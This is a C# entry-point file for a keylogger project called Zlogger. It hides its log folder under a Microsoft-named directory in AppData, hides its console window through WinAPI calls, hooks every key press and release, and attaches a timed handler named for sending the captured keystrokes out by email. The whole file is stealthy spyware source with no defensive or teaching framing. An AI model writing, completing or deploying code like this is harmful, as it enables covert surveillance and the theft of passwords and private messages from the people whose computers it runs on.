using System;
using System.IO;
using System.Windows.Forms;
using Rodjenihm.Zlogger.Core;
using Rodjenihm.Zlogger.WinAPI;

namespace Rodjenihm.Zlogger
{
    class Program
    {
        static void Main(string[] args)
        {
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var logDir = Path.Combine(appData, "Microsoft", "Zlogger");
            Directory.CreateDirectory(logDir).Attributes = FileAttributes.Directory | FileAttributes.Hidden;

            var handle = Kernel32.GetConsoleWindow();
            User32.ShowWindow(handle, (int)WindowState.SW_HIDE);
            using (var keylogger = new Keylogger(logDir))
            {
                keylogger.KeyDown += KeyloggerEventHandler.HandleKeyDown;
                keylogger.KeyUp += KeyloggerEventHandler.HandleKeyUp;
                keylogger.IntervalElapsed += KeyloggerEventHandler.HandleIntervalElapsed_SendEmail;
                keylogger.Run();
                Application.Run();
            }
        }
    }
}
